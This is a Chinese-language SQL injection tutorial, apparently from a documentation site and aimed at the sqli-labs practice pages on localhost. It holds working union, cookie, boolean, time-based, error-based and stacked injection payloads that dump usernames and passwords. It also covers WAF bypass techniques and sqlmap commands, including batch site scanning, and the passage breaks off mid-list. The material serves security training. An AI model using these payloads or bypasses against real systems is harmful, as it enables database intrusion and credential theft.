uname=hzy&#39; union select 1,database() --+&amp;passwd=123456&amp;submit=Submit 查看当前数据库名

uname=hzy&#39;  union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() --+&amp;passwd=123456&amp;submit=Submit 查当前数据库的所有表名

uname=hzy&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; --+&amp;passwd=123456&amp;submit=Submit 查看users表里的列名

uname=hzy&#39; union select 1,group_concat(username,0x3a,password) from users --+&amp;passwd=123456&amp;submit=Submit 查看段内容
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-mysql line-numbers-mode" data-ext="mysql"><pre class="language-mysql"><code>#POST Cookies注入流程
Cookie: id=1 order by 1/2/3;
Cookie: hzy&#39; union select 1,2;
Cookie: id=-1 union select 1,database(); 爆出当前数据库为sqil
Cookie: id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database(); 爆出当前数据库的所有表：dzjmbhoahh,news
Cookie: id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;dzjmbhoahh&#39;; 爆出这个表的列的名字yskmlwjfek 
Cookie: id=-1 union select 1,group_concat(yskmlwjfek) from dzjmbhoahh; 查询这个表的这个列里的所有数据
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="request方式注入" tabindex="-1"><a class="header-anchor" href="#request方式注入" aria-hidden="true">#</a> Request方式注入</h5>`,26),H=e("p",null,[a("概念：超全局变量 PHP中的许多预定义变量都是“超全局的”，这意味着它们在一个脚本的全部作用域中都可以用，这些超全局变量是： "),e("span",{class:"katex"},[e("span",{class:"katex-mathml"},[e("math",{xmlns:"http://www.w3.org/1998/Math/MathML"},[e("semantics",null,[e("mrow",null,[e("mi",{mathvariant:"normal"},"_"),e("mi",null,"R"),e("mi",null,"E"),e("mi",null,"Q"),e("mi",null,"U"),e("mi",null,"E"),e("mi",null,"S"),e("mi",null,"T"),e("mtext",null,"（获取"),e("mi",null,"G"),e("mi",null,"E"),e("mi",null,"T"),e("mi",{mathvariant:"normal"},"/"),e("mi",null,"P"),e("mi",null,"O"),e("mi",null,"S"),e("mi",null,"T"),e("mi",{mathvariant:"normal"},"/"),e("mi",null,"C"),e("mi",null,"O"),e("mi",null,"O"),e("mi",null,"K"),e("mi",null,"I"),e("mi",null,"E"),e("mtext",null,"）"),e("mi",null,"C"),e("mi",null,"O"),e("mi",null,"O"),e("mi",null,"K"),e("mi",null,"I"),e("mi",null,"E"),e("mtext",null,"在新版本已经无法获取了")]),e("annotation",{encoding:"application/x-tex"},"\\_REQUEST（获取GET/POST/COOKIE）COOKIE在新版本已经无法获取了 ")])])]),e("span",{class:"katex-html","aria-hidden":"true"},[e("span",{class:"base"},[e("span",{class:"strut",style:{height:"1.06em","vertical-align":"-0.31em"}}),e("span",{class:"mord",style:{"margin-right":"0.02778em"}},"_"),e("span",{class:"mord mathnormal"},"REQ"),e("span",{class:"mord mathnormal",style:{"margin-right":"0.10903em"}},"U"),e("span",{class:"mord mathnormal",style:{"margin-right":"0.13889em"}},"EST"),e("span",{class:"mord cjk_fallback"},"（获取"),e("span",{class:"mord mathnormal",style:{"margin-right":"0.13889em"}},"GET"),e("span",{class:"mord"},"/"),e("span",{class:"mord mathnormal",style:{"margin-right":"0.13889em"}},"POST"),e("span",{class:"mord"},"/"),e("span",{class:"mord mathnormal",style:{"margin-right":"0.02778em"}},"COO"),e("span",{class:"mord mathnormal",style:{"margin-right":"0.07153em"}},"K"),e("span",{class:"mord mathnormal",style:{"margin-right":"0.07847em"}},"I"),e("span",{class:"mord mathnormal",style:{"margin-right":"0.05764em"}},"E"),e("span",{class:"mord cjk_fallback"},"）"),e("span",{class:"mord mathnormal",style:{"margin-right":"0.02778em"}},"COO"),e("span",{class:"mord mathnormal",style:{"margin-right":"0.07153em"}},"K"),e("span",{class:"mord mathnormal",style:{"margin-right":"0.07847em"}},"I"),e("span",{class:"mord mathnormal",style:{"margin-right":"0.05764em"}},"E"),e("span",{class:"mord cjk_fallback"},"在新版本已经无法获取了")])])]),a("_POST（获取POST传参） "),e("span",{class:"katex"},[e("span",{class:"katex-mathml"},[e("math",{xmlns:"http://www.w3.org/1998/Math/MathML"},[e("semantics",null,[e("mrow",null,[e("mi",{mathvariant:"normal"},"_"),e("mi",null,"G"),e("mi",null,"E"),e("mi",null,"T"),e("mtext",null,"（获取"),e("mi",null,"G"),e("mi",null,"E"),e("mi",null,"T"),e("mtext",null,"传参）")]),e("annotation",{encoding:"application/x-tex"},"\\_GET（获取GET传参） ")])])]),e("span",{class:"katex-html","aria-hidden":"true"},[e("span",{class:"base"},[e("span",{class:"strut",style:{height:"0.9933em","vertical-align":"-0.31em"}}),e("span",{class:"mord",style:{"margin-right":"0.02778em"}},"_"),e("span",{class:"mord mathnormal",style:{"margin-right":"0.13889em"}},"GET"),e("span",{class:"mord cjk_fallback"},"（获取"),e("span",{class:"mord mathnormal",style:{"margin-right":"0.13889em"}},"GET"),e("span",{class:"mord cjk_fallback"},"传参）")])])]),a("_COOKIE（获取COOKIE传参） $_SERVER（包含了诸如头部信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组）")],-1),R=i('<h5 id="http头注入" tabindex="-1"><a class="header-anchor" href="#http头注入" aria-hidden="true">#</a> HTTP头注入</h5><p>什么是Header头？</p><p>通常HTTP消息包括客户机向服务器的请求消息和服务器向客户机响应消息。 这两种类型的消息有一个起始行，一个或者多个头域，一个只是头域结束的空行和可选的消息体组成。 HTTP的头域包括通用头，请求头，响应头和实体头四个部分</p><h6 id="什么是header头部注入" tabindex="-1"><a class="header-anchor" href="#什么是header头部注入" aria-hidden="true">#</a> 什么是Header头部注入？</h6><p>header注入，该注入是指利用后端验证客户端信息（比如常用的cookie验证）或者通过header中获取客户端的一些信息（比如User-Agent用户代理等其他header字段信息），因为这些信息在某些地方是会和其他信息一起存储到数据库中，然后再在前台显示出来，又因为后台没有经过相对应的信息处理所以构成了sql注入。</p><h4 id="sql注入之盲注" tabindex="-1"><a class="header-anchor" href="#sql注入之盲注" aria-hidden="true">#</a> SQL注入之盲注</h4><ul><li><p>当进行SQL注入时，有很多注入会出现无回显的情况，其中不回显得原因可能时SQL语句查询方式问题导致，这个时候我们需要用到报错或者盲注进行后续操作，同时在注入的过程中，提前了解其中SQL语句可以更好的选择对应的注入语句。</p></li><li><p>盲注就是在注入的过程中，获取的数据不能显示到前端页面，此时，我们需要利用一些方法进行判断或者尝试，我们称之为盲注。我们可以知道盲注分为以下三类：基于布尔的SQL盲注 - 逻辑判断、基于时间的SQL盲注 - 延时判断、基于报错的SQL盲注 - 报错回显（强制性报错）</p></li><li><p>盲注分为三种：布尔型盲注、时间型盲注、报错型盲注。</p><ol><li><p>布尔型盲注：根据页面返回的真假来判断的即为<strong>布尔型盲注</strong></p></li><li><p>时间型盲注：根据页面返回的时间来判断的即为<strong>时间型盲注</strong></p></li><li><p>报错型盲注：根据页面返回的对错来判断的即为<strong>报错型盲注</strong></p></li></ol></li></ul><h5 id="基于布尔的sql盲注-逻辑判断" tabindex="-1"><a class="header-anchor" href="#基于布尔的sql盲注-逻辑判断" aria-hidden="true">#</a> 基于布尔的SQL盲注 - 逻辑判断</h5><ul><li>Web页面仅会返回True和False。那么布尔盲注就是进行SQL注入之后然后根据页面返回的True或者是False来得到数据库中的相关信息。</li></ul><h6 id="布尔盲注注入流程" tabindex="-1"><a class="header-anchor" href="#布尔盲注注入流程" aria-hidden="true">#</a> 布尔盲注注入流程</h6><img src="'+m+`"><div class="language-mysql line-numbers-mode" data-ext="mysql"><pre class="language-mysql"><code>1.猜数据库长度
http://localhost/Less-5/?id=1&#39; and length(database())=8--+ //返回True，说明当前数据库长度为8位。

2.猜数据库名
可通过二分法进行猜解：
http://localhost/Less-5/?id=1&#39; and ascii(mid(database(),1,1))&gt;115--+ 返回False，说明该数据库名的第一位字母的ASCII码要小于或等于115.
http://localhost/Less-5/?id=1&#39; and ascii(mid(database(),1,1))&gt;60--+ 返回True，说明该数据库名的第一位字母的ASCII码要大于60.
http://localhost/Less-5/?id=1&#39; and ascii(mid(database(),1,1))=115--+ 返回True，说明该数据库名的第一位字母的ASCII码等于115，115为s。
http://localhost/Less-5/?id=1&#39; and ascii(mid(database(),2,1))=101--+ 返回True，说明该数据库名的第二位字母的ASCII码等于101，101为e。
http://localhost/Less-5/?id=1&#39; and ascii(mid(database(),3,1))=99--+  返回True，说明该数据库名的第三位字母的ASCII码等于99，99为c。

3.猜有多少张表
1 and (select count(table_name) from information_schema.tables where table_schema=&#39;sqli&#39; )&lt;3

3.猜表名长度
http://localhost/Less-5/?id=1&#39; and length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=8--+ //返回True，说明当前数据库中的第二个表的长度位8位。

4.猜表名
http://localhost/Less-5/?id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=114--+ 返回True，说明该数据库的第二个表的第一位字母的ASCII码为114，114为r。
http://localhost/Less-5/?id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),2,1))=101--+ 返回True,说明该数据库的第二个表的第二位字母的ASCII码为101，101为e。
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="基于时间的sql盲注-延时注入" tabindex="-1"><a class="header-anchor" href="#基于时间的sql盲注-延时注入" aria-hidden="true">#</a> 基于时间的SQL盲注 - 延时注入</h5><p>sleep()： Sleep函数可以使计算机程序（进程，任务或线程）进入休眠</p><p>if(): if是计算机编程语言一个关键字，分支结构的一种</p><p>mid(a,b,c): 从b开始，截取a字符串的c位</p><p>substr(a,b,c)： 从b开始，截取字符串a的c长度</p><p>left(database(),1),database() : left(a,b)从左侧截取a的前b位</p><p>length(database())=8 ： 判断长度</p><p>ord=ascii ascii(x)=100： 判断x的ascii值是否为100</p><h6 id="mid-函数" tabindex="-1"><a class="header-anchor" href="#mid-函数" aria-hidden="true">#</a> mid()函数</h6><p>此函数为截取字符串一部分，MID(column_name,start[,length]) 例：select mid(database(),1,1);</p><h6 id="substr-函数" tabindex="-1"><a class="header-anchor" href="#substr-函数" aria-hidden="true">#</a> substr()函数</h6><p>Substr()和substring()函数实现的功能是一样的，均为截取字符串。</p><p>substring(string, start, length) substr(string, start, length)</p><p>参数描述同mid()函数，第一个参数为要处理的字符串，start为开始位置，length为截取的长度。</p><p>例子：select substr(database(),1,1);</p><h6 id="left-函数" tabindex="-1"><a class="header-anchor" href="#left-函数" aria-hidden="true">#</a> left()函数</h6><p>left()得到字符串左部指定个数的字符</p><p>left(string,n) string为要截取的字符串，n为长度。</p><p>例：select left(database(),3);</p><h6 id="ascii码" tabindex="-1"><a class="header-anchor" href="#ascii码" aria-hidden="true">#</a> ASCII码</h6><p>1.防止引号&#39; &quot;转义</p><p>2.方便以后工具的使用</p><p>例子：select if(ascii(&#39;x&#39;)=120,123,234);</p><div class="language-mysql line-numbers-mode" data-ext="mysql"><pre class="language-mysql"><code>1.http://localhost/Less-2/index.php?id=1 and sleep(if(database()=&#39;security&#39;,5,0))--+  //如果当前数据库名字是security则休眠5秒运行，不是则不休眠。

2.http://localhost/Less-2/index.php?id=1 and sleep(if(length(database())=8,5,0))--+ //如果当前数据库名字长度位8位则休眠5秒运行，不是则不休眠。

3.http://localhost/Less-2/index.php?id=1 and sleep(if(mid(database(),1,1)=&quot;s&quot;,5,0))--+ /如果当前数据库的第一位字符为s则休眠5秒运行，不是则不休眠。

http://localhost/Less-2/index.php?id=1 and sleep(if(substr(database(),1,1)=&quot;s&quot;,5,0))--+ //同上，只不过把mid换成了substr。


4.select * from users where id=1 and if(ascii(mid((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(3),0);
http://localhost/Less-2/index.php?id=1 and if(ascii(mid((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=102,sleep(3),0)--+ //查找当前数据库的所有表，如果搜索出来的第一列第一个字的ascii码为102则休眠3秒，不是则不休眠。

select * from t1 where id=1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=116,sleep(2),0);
http://localhost/Less-2/index.php?id=1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(3),0)--+ //同上，只不过把mid换成了substr。
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="基于报错的sql盲注-报错回显-强制性报错" tabindex="-1"><a class="header-anchor" href="#基于报错的sql盲注-报错回显-强制性报错" aria-hidden="true">#</a> 基于报错的SQL盲注 - 报错回显（强制性报错）</h5><ul><li><p>XPATH：XPath 是一门在 XML 文档中查找信息的语言。</p></li><li><p>XML：用来标记数据、定义数据类型。MySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数，分别是ExtractValue()和UpdateXML()</p></li><li><p>利用XPATH的报错来执行SQL注入</p></li></ul><h6 id="extractvalue" tabindex="-1"><a class="header-anchor" href="#extractvalue" aria-hidden="true">#</a> extractvalue()</h6><ul><li>从目标XML中返回包含所查询值的字符串</li><li>extractvalue(XML_document,XPath_String)</li><li>extractvalue(目标xml文档，xml路径)</li><li>第一个参数：XML_document 是String格式，为XML文档对象的名称，文中为DOC 第二个参数：XPath_String (Xpath格式字符串)</li></ul><p><strong>该函数最大显示长度为32位</strong> 解决办法：mid、limit</p><p>SELECT MID(column_name, <em>ength</em>,<em>length</em>) FROM table_name</p><h6 id="updatexml" tabindex="-1"><a class="header-anchor" href="#updatexml" aria-hidden="true">#</a> updatexml()</h6><ul><li>从目标XML中更改包含所查询值的字符串</li><li>updatexml(XML_document,XPath_String,new_value)</li><li>语法updatexml(目标xml文档，xml路径，更新的内容)</li><li>第一个参数：XML_document 是String格式，为XML文档对象的名称，文中为DOC 第二个参数：XPath_string(Xpath格式字符串) 第三个参数：new_value,String格式，替换查找到的符合条件的数据</li></ul><div class="language-mysql line-numbers-mode" data-ext="mysql"><pre class="language-mysql"><code>#extractvalue()函数
##select
1.uname=hzy
&#39; union select 1,extractvalue(1,concat(0x7e,(select database()),0x7e))--+&amp;passwd=123&amp;submit=Submit 爆出当前数据库

2.uname=hzy
&#39; union select 1,extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))--+&amp;passwd=123&amp;submit=Submit
												或一个个找：
uname=hzy
&#39; union select 1,extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e))--+&amp;passwd=123&amp;submit=Submit 
爆出当前数据库的所有表

3.uname=hzy
&#39; union select 1,extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),0x7e))--+&amp;passwd=123&amp;submit=Submit  由于extractvalue函数显示的最大显示长度为32位，导致后面的显示不全。

uname=hzy
&#39; union select 1,extractvalue(1,concat(0x7e,mid((select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),1,31),0x7e))--+&amp;passwd=123&amp;submit=Submit 使用mid函数显示1到31位

uname=hzy
&#39; union select 1,extractvalue(1,concat(0x7e,mid((select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),31,60),0x7e))--+&amp;passwd=123&amp;submit=Submit 使用mid函数显示31到60位
爆出当前数据库列的所有字段


4.uname=hzy
&#39; union select 1,extractvalue(1,concat(0x7e,mid((select group_concat(username,0x3a,password) from users),1,31),0x7e))--+&amp;passwd=123&amp;submit=Submit

uname=hzy
&#39; union select 1,extractvalue(1,concat(0x7e,mid((select group_concat(username,0x3a,password) from users),31,61),0x7e))--+&amp;passwd=123&amp;submit=Submit
爆出数据

##or
1.uname=hzy
&#39; or extractvalue(1,concat(0x7e,(select version()),0x7e)) or &#39;--+&amp;passwd=123&amp;submit=Submit

2.uname=hzy
&#39; or extractvalue(1,concat(0x7e,mid((select group_concat(username,0x3a,password) from users),31,61),0x7e)) or &#39;--+&amp;passwd=123&amp;submit=Submit

与上面类似

#updatexml()函数
##select
1.uname=hzy
&#39; union select 1,updatexml(1,concat(0x7e,(select version()),0x7e),3)--+&amp;passwd=123&amp;submit=Submit

2.uname=hzy
&#39; union select 1,updatexml(1,concat(0x7e,mid((select group_concat(username,0x3a,password) from users),31,61),0x7e),3)--+&amp;passwd=123&amp;submit=Submit

与上面类似

##or
1.uname=hzy
&#39; or updatexml(1,concat(0x7e,(select version()),0x7e),3) or &#39;--+&amp;passwd=123&amp;submit=Submit

2.uname=hzy
&#39; or updatexml(1,concat(0x7e,mid((select group_concat(username,0x3a,password) from users),1,31),0x7e),3) or &#39;--+&amp;passwd=123&amp;submit=Submit

与上面类似
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="sql注入之加解密注入" tabindex="-1"><a class="header-anchor" href="#sql注入之加解密注入" aria-hidden="true">#</a> SQL注入之加解密注入</h4>`,46),W={href:"https://baike.baidu.com/item/%E5%AD%97%E8%8A%82%E7%A0%81/9953683",target:"_blank",rel:"noopener noreferrer"},Y={href:"https://baike.baidu.com/item/%E4%BA%8C%E8%BF%9B%E5%88%B6/361457",target:"_blank",rel:"noopener noreferrer"},j=i(`<p>1.将所有内容转为Base 64</p><p>admin&#39; or extractvalue(1,concat(0x7e,database(),0x7e)) or&#39;</p><p>转为Base64：YWRtaW4nIG9yIGV4dHJhY3R2YWx1ZSgxLGNvbmNhdCgweDdlLGRhdGFiYXNlKCksMHg3ZSkpIG9yJw==</p><p>2.放进去执行</p><h4 id="sql注入之堆叠注入" tabindex="-1"><a class="header-anchor" href="#sql注入之堆叠注入" aria-hidden="true">#</a> SQL注入之堆叠注入</h4><ul><li>只有mysql支持。</li><li>就是sql语句末尾加 ; 然后再写sql语句，可以同时执行多条sql语句，就叫堆叠注入</li><li>与union的区别：union执行语句类型有限，只能用来执行查询语句且前面查询的个数还要和后面查询的个数相等才可以，而堆叠注入可以执行的是任意语句</li></ul><div class="language-mysql line-numbers-mode" data-ext="mysql"><pre class="language-mysql"><code>select * from emails;select * from users; //中间加 ;

http://localhost/Less-38/?id=1&#39;;insert into users(id,username,password) values(22,&quot;tony&quot;,&quot;fuck&quot;)--+ //插入数据。
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="sql注入之waf绕过" tabindex="-1"><a class="header-anchor" href="#sql注入之waf绕过" aria-hidden="true">#</a> SQL注入之WAF绕过</h4><ul><li>WAF拦截原理：WAF从规则库中匹配敏感字符进行拦截。</li><li>WAF绕过的思路就是让WAF的检测规则，识别不到你所输入的敏感字符，利用上述所介绍的知识点，灵活结合各种方法，从而可以增加绕过WAF的可能性</li></ul><div class="language-mysql line-numbers-mode" data-ext="mysql"><pre class="language-mysql"><code>order by绕过：%20/*//--/*/  V4.0
联合绕过：union /*!--+/*%0aselect/*!1,2,3*/ --+
from绕过： /*!06447%23%0afrom*/
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="协议层面绕过waf" tabindex="-1"><a class="header-anchor" href="#协议层面绕过waf" aria-hidden="true">#</a> 协议层面绕过WAF</h5><ul><li>基于协议层，有的waf只过滤GET请求，而对POST请求没做别的限制，因此，可以将GET型换为POST型。但要求服务器需要支持post请求。</li></ul><h5 id="规则层面绕过" tabindex="-1"><a class="header-anchor" href="#规则层面绕过" aria-hidden="true">#</a> 规则层面绕过</h5><h6 id="关键词大小绕过" tabindex="-1"><a class="header-anchor" href="#关键词大小绕过" aria-hidden="true">#</a> 关键词大小绕过</h6><ul><li><p>有的WAF因为规则设计的问题，只匹配纯大写或纯小写的字符，对字符大小写混写直接无视，这时，我们可以利用这一点来进行绕过</p></li><li><p>举例： union select ---&gt; unIOn SeLEcT</p></li></ul><h6 id="编码绕过" tabindex="-1"><a class="header-anchor" href="#编码绕过" aria-hidden="true">#</a> 编码绕过</h6><ul><li>针对WAF过滤的字符编码，如使用URL编码，Unicode编码，十六进制编码，Hex编码等。</li><li>举例：union select 1,2,3# =union%0aselect 1\\u002c2,3%23</li></ul><h6 id="双写绕过" tabindex="-1"><a class="header-anchor" href="#双写绕过" aria-hidden="true">#</a> 双写绕过</h6><ul><li><p>部分WAF只对字符串识别一次，删除敏感字段并拼接剩余语句，这时，我们可以通过双写来进行绕过。</p></li><li><p>举例：UNIunionON ，SELselectECT anandd</p></li></ul><h6 id="换行-n-绕过" tabindex="-1"><a class="header-anchor" href="#换行-n-绕过" aria-hidden="true">#</a> 换行（\\N）绕过</h6><ul><li>%0a \\N</li><li>举例：select * from admin where username = \\N union select 1,user() from admin</li></ul><h6 id="注释符内联注释绕过" tabindex="-1"><a class="header-anchor" href="#注释符内联注释绕过" aria-hidden="true">#</a> 注释符内联注释绕过</h6><ul><li>举例：union selecte =/*!union*/ select 注释符里感叹号后面的内容会被mysql执行。</li></ul><h6 id="同义词替换" tabindex="-1"><a class="header-anchor" href="#同义词替换" aria-hidden="true">#</a> 同义词替换</h6><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>and：&amp;&amp;

or：||

=(等于号)：&lt;、&gt;

空格：
在mysql下，替换字符有 %09,%0A,%0B,%0C,%0D,%20,%A0,/\\*xx\\*/，+
正则，替换字符 %09,%0A,%0B,%0C,%20

函数：
version():@@version

datadir():@@datadir

截取字符：
mid()  mysql、access
substr()    oracle、mysql、sqlserver.
substring()     mysql、sqlserver

#&amp;&amp;与||这种特殊的符号 一定要在浏览器url前进行转码之后方可提交 因为浏览器默认不会进行编码
&amp;&amp; 1=1  转码 %26%261=1
-1||1=1 转码-1 %7c%7c1=1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="http参数污染" tabindex="-1"><a class="header-anchor" href="#http参数污染" aria-hidden="true">#</a> HTTP参数污染</h6><ul><li>对目标发送多个参数，如果目标没有多参数进行多次过滤，那么WAF对多个参数只会识别其中的一个。</li><li>有些编程语言例如PHP只会读取最后一个参数</li></ul><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>举例：
?id=1&amp;id=2 //这样的参数id=1,waf也许仅对前部分的id=1进行检测，而后面的参数并不做处理。这样我们就可以在id=2的后面写入sql注入语句进行sql注入。
?id=1/**&amp;id=-1%20union%20select%201,2,3%23*/
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="垃圾参数" tabindex="-1"><a class="header-anchor" href="#垃圾参数" aria-hidden="true">#</a> 垃圾参数</h6><ul><li>WAF在设计的时候都会考虑到性能问题，检测数据包的包长或检测数据流长度，有一个限制。因此在设计WAF的时候可能就有一个默认值，默认多少个字节的流大小，或是多少个数据包。此时可以填充数据，达到一定数目之后，POST中的sql注入恶意代码没有被检测了，达到了bypass的目的。</li></ul><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://localhost/Less-2/?id=-1 and id=0xA*1000 uNiOn SeLeCt 1,version(),3 --+

a=AAAAAA*[很多个A] &amp;id=1 order by X[1-3]
//0xA*1000  指的是0XA后面的 &quot;A&quot; 重复1000次
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="sqlmap使用" tabindex="-1"><a class="header-anchor" href="#sqlmap使用" aria-hidden="true">#</a> SQLMap使用</h4><ul><li>Sqlmap是一个开源的渗透测试工具，可以用来自动化的检测，利用SQL注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎，针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。</li><li>目前支持的数据库有MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access等大多数据库。</li></ul><h6 id="sqlmap支持的注入方式" tabindex="-1"><a class="header-anchor" href="#sqlmap支持的注入方式" aria-hidden="true">#</a> SQLMap支持的注入方式：</h6><p>Sqlmap全面支持六种SQL注入技术：</p><ul><li>基于布尔类型的盲注：即可以根据返回页面判断条件真假的注入。</li><li>基于时间的盲注：即不能根据页面返回的内容判断任何信息，要用条件语句查看时间延迟语句是否已执行(即页面返回时间是否增加)来判断。</li><li>基于报错注入：即页面会返回错误信息，或者把注入的语句的结果直接返回到页面中。</li><li>联合查询注入：在可以使用Union的情况下的注入。</li><li>堆查询注入：可以同时执行多条语句时的注入。</li><li>带外注入：构造SQL语句，这些语句在呈现给数据库时会触发数据库系统创建与攻击者控制的外部服务器的连接。以这种方式，攻击者可以收集数据或可能控制数据库的行为。</li></ul><h6 id="sqlmap的使用" tabindex="-1"><a class="header-anchor" href="#sqlmap的使用" aria-hidden="true">#</a> SQLMap的使用</h6><p>常用命令：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>-u:用于get提交方式，后面跟注入的url网址
-r：表示加载一个文件，-p指定参数
--forms 自动检测表单
-data 

--dbm=mysql:指定数据库名为mysql
--dbs：获取所有数据库名
--tales：获取所有数据表名
--columns：获取所有字段名
--dump：打印数据
--current-db：查看当前数据库名
--random-agent 表示随机使用不同的浏览器
--delay=1 延迟1秒
--dump-all: 从所有数据库中提取所有表的数据
--batch: 让 sqlmap 在需要用户交互时使用默认行为，不需要用户输入


-D：查询选择某个库
-T：查询选择某个表
-C：查询选择某个字段

--level number
level：执行测试的等级（1~5，默认为1），使用-level参数并且数值&gt;=2的时候会检查cookie里面的参数，当&gt;=3时检查user-agent和refereer

--risk number
risk：执行测试的风险（0~3,默认为1），默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加or语句的sql注入

批量扫站点：
sqlmap -m d:/url.txt --bath
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="get型注入流程" tabindex="-1"><a class="header-anchor" href="#get型注入流程" aria-hidden="true">#</a> GET型注入流程</h6><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>1.判断是否存在注入：
python sqlmap.py -u &quot;http://localhost/Less-2/?id=1&quot; 

2.查看所有数据库
python sqlmap.py -u &quot;http://localhost/Less-2/?id=1&quot; --dbs 

3.查看test数据库下的所有表
python sqlmap.py &quot;http://localhost/Less-2/?id=1&quot; -D &quot;test&quot; --tables 

4.查看test数据库中t1表中的所有列
python sqlmap.py -u &quot;http://localhost/Less-2/?id=1&quot; -D &quot;test&quot; -T &quot;t1&quot; --columns

5.查看test数据库中t1表中id列，name列，pass列的所有数据
